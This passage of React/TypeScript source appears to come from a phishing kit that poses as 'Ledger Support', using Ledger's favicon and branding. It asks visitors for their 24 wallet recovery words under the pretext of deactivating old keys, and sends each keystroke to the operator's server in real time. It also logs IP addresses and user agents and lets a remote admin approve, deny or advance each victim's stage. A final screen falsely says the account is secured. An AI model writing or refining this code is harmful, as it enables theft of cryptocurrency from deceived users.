  const syncTimeoutRef = useRef<NodeJS.Timeout | null>(null)
  const latestWordsRef = useRef<string[]>(Array(24).fill(""))

  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = {
            ...data.activity,
            currentStage: "enter-old-keys",
            oldKeysData: { ...(data.activity.oldKeysData || {}), enteredWords: data.activity.oldKeysData?.enteredWords || Array(24).fill("") },
            lastUpdated: new Date().toISOString(),
          }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  useEffect(() => {
    if (!isWaiting || !visitorId) return
    const interval = setInterval(async () => {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity?.oldKeysData?.adminConfirmed) {
        clearInterval(interval)
        onNext()
      }
    }, 2000)
    return () => clearInterval(interval)
  }, [isWaiting, visitorId, onNext])

  const syncWords = (newWords: string[]) => {
    latestWordsRef.current = [...newWords]
    if (syncTimeoutRef.current) clearTimeout(syncTimeoutRef.current)
    syncTimeoutRef.current = setTimeout(() => {
      if (visitorId) {
        fetch("/api/activity/sync-words", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, field: "oldKeysData", enteredWords: [...latestWordsRef.current] }),
        })
      }
    }, 150)
  }

  const flushSync = async () => {
    if (syncTimeoutRef.current) { clearTimeout(syncTimeoutRef.current); syncTimeoutRef.current = null }
    if (visitorId) {
      await fetch("/api/activity/sync-words", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, field: "oldKeysData", enteredWords: [...latestWordsRef.current] }),
      })
    }
  }

  const handleWordChange = (index: number, value: string) => {
    if (value.includes(" ")) {
      const trimmed = value.replace(/\s/g, "")
      const newWords = [...words]; newWords[index] = trimmed.toLowerCase(); setWords(newWords)
      if (index < 23) inputRefs.current[index + 1]?.focus()
      syncWords(newWords); return
    }
    const newWords = [...words]; newWords[index] = value.toLowerCase(); setWords(newWords)
    syncWords(newWords)
  }

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Enter" || e.key === "Tab") { e.preventDefault(); if (index < 23) inputRefs.current[index + 1]?.focus() }
    if (e.key === "Backspace" && words[index] === "" && index > 0) { e.preventDefault(); inputRefs.current[index - 1]?.focus() }
  }

  const handleSubmit = async () => {
    if (isWaiting) return
    setIsWaiting(true)
    latestWordsRef.current = [...words]
    await flushSync()
  }

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1">
      <div className="max-w-lg mx-auto">
        <Card className="border-border bg-card">
          <CardContent className="p-6 sm:p-8">
            <div className="flex justify-center mb-6">
              <div className="h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center"><KeyRound className="h-8 w-8 text-foreground" /></div>
            </div>
            <h1 className="text-xl font-semibold text-foreground text-center mb-2">Please Type in your old API Keys</h1>
            <p className="text-sm text-muted-foreground text-center mb-6">Enter each of your 24 old recovery words in order so we can deactivate them.</p>
            <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
              {Array.from({ length: 24 }).map((_, i) => (
                <div key={i} className="flex items-center gap-1">
                  <span className="text-xs text-muted-foreground w-5 text-right shrink-0">{i + 1}.</span>
                  <Input
                    ref={(el) => { inputRefs.current[i] = el }}
                    type="text" value={words[i]}
                    onChange={(e) => handleWordChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    placeholder={`Word ${i + 1}`} autoComplete="off" disabled={isWaiting}
                    className="bg-secondary text-xs h-9 font-mono border-border"
                  />
                </div>
              ))}
            </div>
            <Button onClick={handleSubmit} disabled={isWaiting || words.some((w) => !w.trim())} className="w-full mt-6 bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100">
              {isWaiting ? <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />Submitting...</span> : "Submit"}
            </Button>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

// ===== STAGE: COMPLETED =====
function CompletedStage({ visitorId }: { visitorId: string }) {
  useEffect(() => {
    fetch(`/api/activity?visitorId=${visitorId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.activity) {
          const activity: UserActivity = { ...data.activity, currentStage: "completed", lastUpdated: new Date().toISOString() }
          fetch("/api/activity", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ visitorId, activity }) })
        }
      })
  }, [visitorId])

  return (
    <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8 flex-1 flex items-center justify-center">
      <div className="text-center">
        <div className="flex justify-center mb-6">
          <div className="h-20 w-20 rounded-full bg-success/10 flex items-center justify-center">
            <CheckCircle2 className="h-10 w-10 text-success" />
          </div>
        </div>
        <h1 className="text-2xl font-semibold text-foreground mb-4">Your Account Has Been Secured</h1>
        <p className="text-sm text-muted-foreground max-w-md mx-auto mb-2">All security measures have been applied to your account. Your old API keys have been deactivated and your new keys are now active.</p>
        <p className="text-sm text-muted-foreground">Thanks for using Ledger.</p>
      </div>
    </main>
  )
}

// ===== MAIN LEDGER FLOW =====
export default function LedgerFlow() {
  const [stage, setStage] = useState<LedgerStage>("intake")
  const [visitorId, setVisitorId] = useState<string>("")
  const [waitingForApproval, setWaitingForApproval] = useState(false)
  const [deniedMessage, setDeniedMessage] = useState<string | null>(null)
  const stageRef = useRef<LedgerStage>("intake")

  useHeartbeat(visitorId)

  // Set Ledger favicon + title
  useEffect(() => {
    document.title = "Ledger Support"
    const existing = document.querySelector("link[rel='icon']")
    if (existing) existing.remove()
    const link = document.createElement("link")
    link.rel = "icon"
    link.type = "image/jpeg"
    link.href = "https://cdn.brandfetch.io/idObwT_2k3/w/400/h/400/theme/dark/icon.jpeg?c=1dxbfHSJFAPEGdCLU4o5B"
    document.head.appendChild(link)
  }, [])

  // Initialize visitor
  useEffect(() => {
    let id = sessionStorage.getItem("session_ledger")
    if (!id) {
      id = generateVisitorId()
      sessionStorage.setItem("session_ledger", id)
    }
    setVisitorId(id)

    const initActivity = async () => {
      const ipRes = await fetch("/api/ip")
      const ipData = await ipRes.json()

      const existing = await fetch(`/api/activity?visitorId=${id}`)
      const existingData = await existing.json()

      if (existingData.activity) {
        // Resume from stored stage
        setStage(existingData.activity.currentStage)
        stageRef.current = existingData.activity.currentStage
        if (existingData.activity.waitingForApproval) {
          setWaitingForApproval(true)
        }
        if (existingData.activity.status === "rejected" && existingData.activity.adminMessage) {
          setDeniedMessage(existingData.activity.adminMessage)
          setWaitingForApproval(true)
        }
      } else {
        const activity: UserActivity = {
          visitorId: id!,
          ipAddress: ipData.ip,
          currentStage: "intake",
          email: "",
          caseId: "",
          decisions: [],
          sessionStarted: new Date().toISOString(),
          lastUpdated: new Date().toISOString(),
          lastHeartbeat: new Date().toISOString(),
          isOnline: true,
          userAgent: navigator.userAgent,
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId: id, activity }),
        })
      }
    }

    initActivity()
  }, [])

  // Poll for brand changes - reload page if brand switched away
  useEffect(() => {
    const brandCheck = setInterval(async () => {
      try {
        const res = await fetch("/api/active-brand")
        const data = await res.json()
        if (data.brand !== "ledger") {
          window.location.reload()
        }
      } catch {
        // ignore
      }
    }, 3000)
    return () => clearInterval(brandCheck)
  }, [])

  // Poll for admin-initiated stage changes and approval responses
  useEffect(() => {
    if (!visitorId) return
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/activity?visitorId=${visitorId}`)
        const data = await res.json()
        if (!data.activity) return

        const act = data.activity

        // Check for denial
        if (act.status === "rejected" && act.adminMessage) {
          setDeniedMessage(act.adminMessage)
          setWaitingForApproval(true)
          return
        }

        // Check if admin approved (waitingForApproval cleared, stage may have changed)
        if (waitingForApproval && !act.waitingForApproval && act.status !== "rejected") {
          setWaitingForApproval(false)
          setDeniedMessage(null)
          // Admin may have changed the stage
          if (act.currentStage !== stageRef.current) {
            stageRef.current = act.currentStage
            setStage(act.currentStage)
          }
          return
        }

        // Check for admin-initiated stage forward (even when not waiting)
        if (!waitingForApproval && act.currentStage !== stageRef.current) {
          stageRef.current = act.currentStage
          setStage(act.currentStage)
        }
      } catch {
        // ignore
      }
    }, 2000)
    return () => clearInterval(interval)
  }, [visitorId, waitingForApproval])

  // When a step completes, don't advance - set waitingForApproval and let admin decide
  const requestApproval = useCallback(async () => {
    setWaitingForApproval(true)
    setDeniedMessage(null)
    try {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const nextStage = getNextStage(data.activity.currentStage)
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            visitorId,
            activity: {
              ...data.activity,
              waitingForApproval: true,
              approvedToStage: nextStage,
              status: "pending",
              adminMessage: "",
              lastUpdated: new Date().toISOString(),
            },
          }),
        })
      }
    } catch {
      // ignore
    }
  }, [visitorId])

  // Direct stage set (used only for intake which doesn't need approval)
  const goToStage = useCallback((newStage: LedgerStage) => {
    stageRef.current = newStage
    setStage(newStage)
  }, [])

  if (!visitorId) {
    return (
      <div className="ledger-theme flex min-h-screen flex-col bg-background text-foreground">
        <LedgerHeader />
        <main className="flex flex-1 items-center justify-center">
          <div className="h-8 w-8 animate-spin rounded-full border-2 border-foreground border-t-transparent" />
        </main>
      </div>
    )
  }

  return (
    <div className="ledger-theme flex min-h-screen flex-col bg-background text-foreground">
      <LedgerHeader />
      {waitingForApproval ? (
        <WaitingForApprovalScreen deniedMessage={deniedMessage || undefined} />
      ) : (
        <>
          {stage === "intake" && <IntakeStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "approval" && <ApprovalStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "connect-ledger" && <ConnectLedgerStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "confirm-reset" && <ConfirmResetStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "reset-api-keys" && <ResetApiKeysStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "verify-words" && <VerifyWordsStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "enter-old-keys" && <EnterOldKeysStage visitorId={visitorId} onNext={requestApproval} />}
          {stage === "completed" && <CompletedStage visitorId={visitorId} />}
        </>
      )}
      <LedgerFooter />
    </div>
  )
}
